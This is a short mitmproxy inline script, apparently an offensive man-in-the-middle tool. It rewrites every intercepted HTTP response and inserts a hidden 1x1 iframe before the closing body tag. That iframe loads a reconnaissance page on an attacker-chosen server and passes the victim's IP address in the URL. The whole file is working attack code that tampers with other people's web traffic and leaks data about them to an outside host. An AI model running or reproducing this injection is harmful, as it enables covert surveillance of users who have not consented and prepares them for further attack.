# Usage: mitmdump -s "inject_recon.py server"
# (this script works best with --anticache)
from libmproxy.protocol.http import decoded


def start(context, argv):
	if len(argv) != 2:
		raise ValueError('Usage: -s "inject_recon.py server"')
	# You may want to use Python's argparse for more sophisticated argument parsing.
	context.server = argv[1]


def response(context, flow):
	with decoded(flow.response):  # automatically decode gzipped responses.
		
		client_conn = str(flow.client_conn)
		server_conn = str(flow.client_conn)
	
		client_conn = client_conn.split(" ")[1]
		client_conn = client_conn.split(":")[0]

		inject_recon = "\n<iframe src='http://"+context.server+"/recon/recon.php?client_conn="+client_conn+"' height='1' width='1' style='display:none'></iframe>\n"

		flow.response.content = flow.response.content.replace("</body>", inject_recon + "</body>")
		flow.response.content = flow.response.content.replace("client_conn_xxx_xxx_xxx_xxx", client_conn)
